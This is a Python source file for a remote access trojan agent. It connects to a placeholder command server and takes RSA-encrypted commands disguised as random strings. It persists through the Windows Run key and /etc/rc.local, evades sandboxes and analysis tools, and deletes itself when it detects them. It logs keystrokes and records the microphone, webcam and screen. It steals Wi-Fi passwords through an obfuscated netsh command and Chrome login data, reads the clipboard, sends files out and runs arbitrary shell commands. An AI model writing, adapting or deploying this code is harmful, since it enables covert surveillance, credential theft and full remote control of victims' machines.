import socket
import subprocess
import json
import os
import base64
from PIL import ImageGrab
from io import BytesIO
from cv2 import VideoCapture,imencode
import platform, uuid, getpass
if platform.system().lower() == "windows":
    from win32crypt import CryptUnprotectData
    import dxcam
from datetime import datetime
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import serialization, hashes
from pynput import keyboard
import pyaudio
import wave
from requests import get, post
import numpy as np
import mss
import threading
import time
import sys
try:
    subprocess.Popen("chrome.exe")
except:
    pass
import shutil
import psutil
from av import open as avopen, VideoFrame
import pyperclip
import ctypes
import hashlib

private_key = rsa.generate_private_key(
    public_exponent=65537,
    key_size=2048,
)
public_key = private_key.public_key()
pem_public_key = public_key.public_bytes(
    encoding=serialization.Encoding.PEM,
    format=serialization.PublicFormat.SubjectPublicKeyInfo
).decode('utf-8')

peer_key = None


if platform.system().lower()=="windows":
    print(os.path.dirname(os.path.abspath(sys.argv[0])))
    if "rarsfx" in os.path.basename(os.path.dirname(os.path.abspath(sys.argv[0]))).lower():
        oneup = os.path.sep.join(os.path.dirname(os.path.abspath(sys.argv[0])).split(os.path.sep)[:-1])
        if os.path.dirname(os.path.abspath(sys.argv[0])).split(os.path.sep)[-2].lower() == "temp":
            for f in os.listdir(oneup):
                if "rarsfx" in f.lower() or f.lower().startswith("_mei"):
                    try:
                        print(os.path.join(oneup, f))
                        shutil.rmtree(os.path.join(oneup, f))
                    except Exception as e:
                        print(f"Error: {e}")
                        pass

class Agent:
    def __init__(self):
        if self.scan_processes():
            sys.exit()
        if self.is_vm():
            self.destroy()
            sys.exit()
        
        #adds the agent script to startup key if agent is on windows system
        if platform.system().lower() == "windows":
            try:
                import winreg
                HKCU = winreg.HKEY_CURRENT_USER
                startup = winreg.OpenKeyEx(HKCU, r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, winreg.KEY_SET_VALUE)
                winreg.SetValueEx(startup, "<exe.name.here>", 0, winreg.REG_SZ, "<payload.path.here>")
                winreg.CloseKey(startup)
            except Exception as e:
                print(e)

        # Adds agent script to /etc/rc.local if it's a Linux system
        elif platform.system().lower() == "linux":
            rc_local_path = "/etc/rc.local"
            script_path = os.path.abspath(__file__)
            startup_command = f"/usr/bin/python3 {script_path} 2>&1 &"

            try:
                # Create /etc/rc.local with the initial structure and startup command
                with open(rc_local_path, 'w') as file:
                    file.write("#!/bin/bash \n")
                    file.write("export DISPLAY=:0 \n")
                    file.write(startup_command + "\n")
                    file.write("exit 0\n")
                # Make the script executable
                os.chmod(rc_local_path, 0o755)
            except Exception as e:
                print (f"[ ERROR ] Linux persistence setup failed: {str(e)}")
        
        
        self.conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            self.conn.connect(("<placeholder.your.domain.name>", 0000))
        except TimeoutError:
            try:
                self.conn.connect(("<placeholder.your.domain.name>", 0000))
            except:
                exit()
        except:
            exit()
        self.keylog_data = []
        self.keylog_active = False
        self.listener = None
        self.is_recording = False
        self.hostname = ""
        self.audio = None
        self.stream = None
        self.frames = []
        self.scrc = False
        self.scrThread = None
        self.script_path = "<payload.path.here>"
  

    def serialize_send(self, data):
        json_data = json.dumps(data)
        self.conn.send(json_data.encode())

    def serialize_receive(self):
        json_data = b""
        while True:
            try:
                json_data += self.conn.recv(1024)
                return json.loads(json_data.decode())
            except ValueError:
                continue

    def exec(self, command):
        try:
            return subprocess.check_output(command, shell=True).decode()
        except:
            return None

    def change_dir(self, path):
        try:
            os.chdir(path)
            return True
        except FileNotFoundError:
            return False
        except Exception as e:
            return f"An error occurred: {e}"

    def send_file(self, url, path):
        try:
            if os.path.getsize(path) < 262144000:
                with open(path, "rb") as f:
                    response = post(url, files={"file":f}, headers={"X-Forwarded-Host": self.hostname})
                    return "N3xL8T4rQ1P7yK2" if response.status_code == 200 else f"F9xM1T2rL8P4yJ5"

            else:
                return False
        except FileNotFoundError:
            return None
        except Exception as e:
            return f"An error occurred: {e}"

    def receive_file(self, url, path):
        try: 
            data = get(url)
            with open (path, "wb") as file:
                file.write(data.content)
                return "A7xL9Q2rT4M1wK8"
        except FileNotFoundError:
            return f"J3rL8T2xP9M1yK4"
        except PermissionError:
            return f"K7T2xQ1L8P5yJ0F"
        except Exception as e:
            return f"An error occurred during file upload: \n{e}"

    def ss(self):
        os.environ["DISPLAY"] = ":0"
        try:
            myss = mss.mss().grab(mss.mss().monitors[0])
            img = mss.tools.to_png(myss.rgb, myss.size, output=None)
            return base64.b64encode(img).decode('ascii')
        except Exception as e:
            return None
        
    def on_cam(self):
        try:
            vc = VideoCapture(0)
            if vc.isOpened():
                rval, frame = vc.read()

                if rval:
                    image = imencode('.png', frame)
                    image = image[1].tobytes()
                    return base64.b64encode(image).decode('ascii')
                else:
                    return None

        except Exception as e:
            return None
        
    def sww(self, command):
        try:
            wifiNetworks = []
            output = subprocess.check_output(command, shell=True).decode('cp1252').splitlines()
            for line in output:
                line = line.strip()
                if line.startswith(base64.b64decode("QWxsIFVzZXIgUHJvZmlsZQ==").decode()):
                    wifiNet = line.split(':')[1].strip()
                    try:
                        password = self.exec("".join([chr(i) for i in [110, 101, 116, 115, 104, 32, 119, 108, 97, 110, 32, 115, 104, 111, 119, 32, 112, 114, 111, 102, 105, 108, 101, 32, 34]]) + wifiNet + "".join([chr(i) for i in [34, 32, 107, 101, 121, 61, 99, 108, 101, 97, 114, 32, 124, 32, 102, 105, 110, 100, 115, 116, 114, 32, 47, 67, 58, 34, 75, 101, 121, 32, 67, 111, 110, 116, 101, 110, 116, 34]])).split(':')[1].strip()
                    except:
                        password = "*NOT FOUND*"
                    wifiNetworks.append((wifiNet, password))
            output = wifiNetworks
            if not wifiNetworks:
                output = "Unable to find any networks"
            return output
        except Exception as e:
            return f"An error occurred: {e}"
        
    def sbc(self, path1, path2, F2xM7T1Q9P4rL8yJ0V5N6K3B, N9xL2T1Q4rP8mK5yJ0V7F3B6x):
        try:
            USERDIR = os.getenv('USERPROFILE')
            with open(os.path.join(USERDIR, path1)) as f:
                dataJSON = json.load(f)
                protectedKey = base64.b64decode(dataJSON[F2xM7T1Q9P4rL8yJ0V5N6K3B][N9xL2T1Q4rP8mK5yJ0V7F3B6x])

                secretKey = protectedKey[5:]
                secretKey = CryptUnprotectData(secretKey)[1]
            
            secretKey = base64.b64encode(secretKey).decode('ascii')
            path = os.path.join(USERDIR, path2)
            try:
                if os.path.getsize(path) < 26214400:
                    with open(path, "rb") as f:
                        encodedb64 = base64.b64encode(f.read())
                        loginData = encodedb64.decode('ascii')
                else:
                    loginData = None
            except FileNotFoundError:
                loginData = None
            return [secretKey, loginData]
        except Exception as e:
            return f"An error occurred: {e}"
        
    def bkl(self):
        if not self.keylog_active:
            self.keylog_active = True
            self.keylog_data = []

            def on_press(key):
                try:
                    if isinstance(key, keyboard.Key):
                        key_name = str(key).replace('Key.', '').upper()
                        self.keylog_data.append(f'[{key_name}]')
                    else:
                        self.keylog_data.append(f'{key.char}')
                except AttributeError:
                    pass
            
            self.listener = keyboard.Listener(on_press=on_press)
            self.listener.start()
            self.keylog_start_time = datetime.now()
            return "Q1xM4T2L9P7rK5yJ3V6F0N8xBL3T5xQ9rM1P"
        else:
            return "8w2JF98x"
        
    def stkl(self):
        if self.keylog_active:
            self.keylog_active = False
            self.keylog_stop_time = datetime.now()
            if self.listener is not None:
                self.listener.stop()
            return "D8xL2T1rQ9mP4wK5V7J0F3N6x"
        else:
            return "M4T9P7yL2K5V"
    
    def gkl(self):
        if self.keylog_data:
            self.keylog_stop_time = datetime.now()

            return [self.keylog_data, self.keylog_start_time.strftime('%Y-%m-%d %H:%M:%S'), self.keylog_stop_time.strftime('%Y-%m-%d %H:%M:%S')]
        else:
            return None
        
    def svc(self):
        if not self.is_recording:
            self.audio = pyaudio.PyAudio()

            def callback(in_data, frame_count, time_info, status):
                self.frames.append(in_data)
                return (None, pyaudio.paContinue)
        
            self.stream = self.audio.open(format=pyaudio.paInt16, channels=1, rate=13000,input=True,frames_per_buffer=1024, stream_callback=callback)
            self.is_recording = True
            self.stream.start_stream()
            return "J9xT1rM4L8P2wK7V3yF0Q5N6xR"
        else:
            return "K4T9rL1Q2xM7P8yJ3V5F0N6xB"
        
    def spvc(self):
        if self.is_recording:
            self.stream.stop_stream()
            self.stream.close()
            self.audio.terminate()

            audio_buffer = BytesIO()
            with wave.open(audio_buffer, 'wb') as wf:
                wf.setnchannels(1)
                wf.setsampwidth(self.audio.get_sample_size(pyaudio.paInt16))
                wf.setframerate(13000)
                wf.writeframes(b''.join(self.frames))
            
            audio_buffer.seek(0)
            
            max_size = 8 * 1024 * 1024
            if audio_buffer.tell() > max_size:
                audio_buffer.truncate(max_size)
                audio_buffer.seek(0)
            audio_base64 = base64.b64encode(audio_buffer.read()).decode('ascii')
            self.is_recording = False
            self.frames = []
            return audio_base64
        else:
            return None

    def destroy(self): #add this function
        try:
            os.remove(self.script_path)
            return "X7pL3mQ9rT2V5yJ8K1wF4N6xR0B"
        except Exception as e:
            return f"An error occurred: {e}"
        
    def scr(self, R5L7T2xQ9mP4wK1yV8J3F0N6xB):
        self.scrc = True
        try:
            camera = dxcam.create(output_idx=0, output_color="RGB")
            camera.start(target_fps=20, video_mode=True)

            screen_width, screen_height = mss.mss().monitors[1]['width'], mss.mss().monitors[1]['height']
            fps = 20
            memoryFile = BytesIO()

            output = avopen(memoryFile, 'w', format="mp4")
            stream = output.add_stream('h264', str(fps))
            stream.width = screen_width
            stream.height = screen_height

            while self.scrc:
                frame = VideoFrame.from_ndarray(camera.get_latest_frame())
                packet = stream.encode(frame)
                output.mux(packet)

                if memoryFile.getbuffer().nbytes > 24000000:
                    packet = stream.encode(None)
                    output.mux(packet)
                    output.close()
                    response = post(R5L7T2xQ9mP4wK1yV8J3F0N6xB, files={"file":memoryFile.getvalue()}, headers={"X-Forwarded-Host": self.hostname})
                    memoryFile = BytesIO()
                    output = avopen(memoryFile, 'w', format="mp4")
                    stream = output.add_stream('h264', str(fps))
                    stream.width, stream.height = screen_width, screen_height
        
        except Exception as e:
            self.scrc = False
        finally:
            try:
                camera.stop()
                camera.release()
                del camera
                if memoryFile.getbuffer().nbytes:
                    packet = stream.encode(None)
                    output.mux(packet)
                    output.close()
                    response = post(R5L7T2xQ9mP4wK1yV8J3F0N6xB, files={"file":memoryFile.getvalue()}, headers={"X-Forwarded-Host": self.hostname})
            except Exception as e:
                pass

    def get_system_info(self):
        try:
            try:
                    # Get public IP address
                public_ip = get('https://api.ipify.org?format=json').json()['ip']
            except Exception as e:
                public_ip = "Unavailable"

                # Get private IP address (example using subprocess, adjust as needed)

            info = [
                public_ip,
                platform.machine(),
                platform.node(),
                platform.system(),
                platform.uname().machine,
                platform.uname().node,
                platform.uname().release,
                platform.uname().version,
                getpass.getuser(),
                ctypes.windll.shell32.IsUserAnAdmin() if platform.system().lower() == "windows" else (os.geteuid() == 0 if platform.system().lower() == "linux" else "Unknown"),
                ':'.join(['{:02x}'.format((uuid.getnode() >> elements * 8) & 0xff) for elements in range(6)])
            ]
            return info
        except Exception as e:
            return str(e)
        
    def scan_processes(self):
        try:
            जिसमें字を含세계む長いчн = ["vmsrvc.exe", "vmusrvc.exe", "tcpview.exe", "wireshark.exe", "fiddler.exe", "vboxservice.exe", "vboxtray.exe", "procmon.exe", "procmon64.exe", "procexp.exe", "procexp64.exe", "regshot-x64-unicode.exe", "regshot-x64-ansi.exe", "processhacker.exe", "procdot.exe", "filegrab.exe"]
            for proc in psutil.process_iter(['name']):
                if proc.info['name'].lower() in जिसमें字を含세계む長いчн:
                    return True
            return False
        except Exception as e:
            return f"An error occurred: {e}"
        
    def is_vm(self):
        try:
            if psutil.virtual_memory().total < 2 * 1024**3:  # Less than 2 GB RAM
                return True
            if psutil.cpu_count(logical=False) <= 2:  # Less than 2 physical CPUs
                return True

            # Check for small screen resolution often used in sandboxes
            screen_width = ctypes.windll.user32.GetSystemMetrics(0)
            screen_height = ctypes.windll.user32.GetSystemMetrics(1)
            if screen_width <= 1024 and screen_height <= 768:
                return True
            
            if os.path.exists("C:\\Windows\\System32\\drivers\\vboxguest.sys"):
                return True
            return False
        except:
            return False
        
    def monitor_system_performance(self):
        try:
            cpu_usage = psutil.cpu_percent(interval=1)
            memory_info = psutil.virtual_memory()
            performance_data = {
                "CPU Cores": psutil.cpu_count(logical=False),
                "Logical CPUs": psutil.cpu_count(logical=True),
                "CPU Usage": cpu_usage,
                "Total Memory (GB)": memory_info.total / (1024 * 1024 * 1024),
                "Used Memory (GB)": memory_info.used / (1024 * 1024 * 1024),
                "Available Memory": memory_info.available / (1024 * 1024 * 1024),
                "Memory Percentage Used": memory_info.percent
            }
            return f"[+] Victim Machine: {performance_data}"
        except Exception as e:
            return f"An error occurred: {e}"
        
    def capture_clipboard(self):
        try:
            clipboard_content = pyperclip.paste()
            return clipboard_content
        except Exception as e:
            return f"An error occurred: {e}"
        
    def file_hash(self):
        self.script_path = os.path.abspath(sys.argv[0])
        sha256 = hashlib.sha256()
        try:
            with open(self.script_path, 'rb') as f:
                while chunk := f.read(8192):
                    sha256.update(chunk)
            hash = sha256.hexdigest()
            return hash
        except FileNotFoundError:
            return None

    def check_integrity(self):
        try:
            current_hash = self.file_hash()
            return current_hash
        except Exception as e:
            return f"An error occurred: {e}"

    def listen(self):
        while True:
            command = self.serialize_receive()
            if len(command) == 8:
                firstWord = command.split(" ",1)[0]
                if firstWord == "hostname":
                    output = self.exec(command)
                    self.hostname = output.strip().lower()
                    self.serialize_send(output)
            elif "BEGIN PUBLIC KEY" in command:
                pem_peer_key = command.encode('utf-8')
                peer_key = serialization.load_pem_public_key(pem_peer_key)
                self.serialize_send(pem_public_key)
            else:
                if isinstance(command, list):
                    decrypted_command = []
                    for command in command:
                        encrypted_chunk = base64.b64decode(command)
                        decrypted_chunk = private_key.decrypt(
                            encrypted_chunk,
                            padding.OAEP(
                                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                                algorithm=hashes.SHA256(),
                                label=None
                            )
                        )
                        decrypted_command.append(decrypted_chunk)
                    decrypted_command = b''.join(decrypted_command)
                    command = decrypted_command
                else:
                    command = base64.b64decode(command)
                    command = private_key.decrypt(
                        command,
                        padding.OAEP(
                            mgf=padding.MGF1(algorithm=hashes.SHA256()),
                            algorithm=hashes.SHA256(),
                            label=None
                        )
                    )
                command = command.decode('utf-8')
                firstWord = command.split(" ",1)[0]
                if firstWord == "4fT9kB7mR2xQ6wL1yP8jA":
                    self.scrc = False
                    self.conn.close()
                    sys.exit()
                elif firstWord == "cd" and len(command.split()) > 1:
                    output = self.change_dir(command.split()[1])
                elif firstWord == "J3hX7rQ5nW8mV2zT1kL9":
                    output = self.send_file(command.split()[1],command.split(" ", 2)[-1])
                elif firstWord == "G5tH9wE2zR8vY1xQ7pM4":
                    commandList = command.split(" ", 2)
                    output = self.receive_file(commandList[1], commandList[-1])
                elif command == "B8vT3kR1mW9jQ7xL2yF":
                    output = self.ss()
                elif command == "Z4nJ7rX5pQ1wV8mL2kT":
                    output = self.on_cam()
                elif firstWord == "H9yR2xP6mV1Q4wT7zB8":
                    if platform.system().lower() == "windows":
                        output = self.sww(command.split(" ", 1)[1])
                    else:
                        output = None
                elif firstWord == "K5xL8rT2Q9mJ1vW3yP7":
                    if platform.system().lower() == "windows":
                        output = output = self.sbc(command.split('\n')[1], command.split('\n')[2], command.split('\n')[3], command.split('\n')[-1])
                    else:
                        output = None
                elif firstWord == "F7wR4xJ1Q8mT2kL9yP6":
                    output = self.bkl()
                elif firstWord == "N3zK8rV1xQ5T2mW7yP4":
                    output = self.stkl()
                elif firstWord == "M9jT2rL7Q4xV1wK8yP5":
                    output = self.gkl()
                elif firstWord == "X1rM6wQ9T2kL7yP4vJ8":
                    output = self.svc()
                elif firstWord == "P8T3xQ1mL7rV4wK9yJ2":
                    output = self.spvc()
                elif firstWord  == "L4kR9xQ2mT1wJ7yP8V5":
                    if platform.system().lower() == "windows":
                        if self.scrThread is None or not self.scrThread.is_alive():
                            self.scrThread = threading.Thread(target=self.scr, args=(command.split()[-1],))
                            self.scrThread.start()
                            output = "K3T1rL7xQ8mP9yV4wJ0F5N2xL6B8R"
                        else:
                            output = "J6F0N2"
                    else:
                        output = None
                elif firstWord == "A5xN2rM9Q8T1kL7wV3J":
                    if self.scrThread is not None and self.scrThread.is_alive():
                        self.scrc = False
                        self.scrThread.join()
                        output = "F1xQ8rL2T9mW4yP7K3V6J0B5N2xR8T"
                    else:
                        output = "Q2mP7rW8yK"
                elif firstWord == "C4rM8T2Q7xJ1wL9yV5K":
                    output = str(self.scrc)
                elif firstWord == "D1xP9Q4T7mL8rW2yK5V":
                    output = self.destroy()
                elif firstWord == "E8T3rL1Q2xW7mV9yK4P":
                    output = self.get_system_info()
                elif firstWord == "ql5DgQrCj4G8pm6yXGvPh7lq":
                    output = self.scan_processes()
                elif firstWord == "G7t8R4pL9nQw2kVx0m":
                    output = self.monitor_system_performance()
                elif firstWord == "D1sZ3bF":
                    output = self.capture_clipboard()
                elif firstWord == "hash":
                    output = self.check_integrity()
                else:
                    output = self.exec(command)
                max_chunk_size = 190
                if output is None:
                    self.serialize_send(output)
                else:
                    output = json.dumps(output)
                    output = output.encode()
                    if len(output) > max_chunk_size:
                        chunks = [output[i:i + max_chunk_size] for i in range(0, len(output), max_chunk_size)]
                        encrypted_output = []
                        for chunk in chunks:
                            encrypted_chunk = peer_key.encrypt(
                                chunk,
                                padding.OAEP(
                                    mgf=padding.MGF1(algorithm=hashes.SHA256()),
                                    algorithm=hashes.SHA256(),
                                    label=None
                                )
                            )
                            encrypted_output.append(base64.b64encode(encrypted_chunk).decode('utf-8'))
                        self.serialize_send(encrypted_output)
                    else:
                        encrypted_output = peer_key.encrypt(
                            output,
                            padding.OAEP(
                                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                                algorithm=hashes.SHA256(),
                                label=None
                            )
                        )
                        encrypted_output = base64.b64encode(encrypted_output).decode('utf-8')
                        self.serialize_send(encrypted_output)

myAgent = Agent()
myAgent.listen()
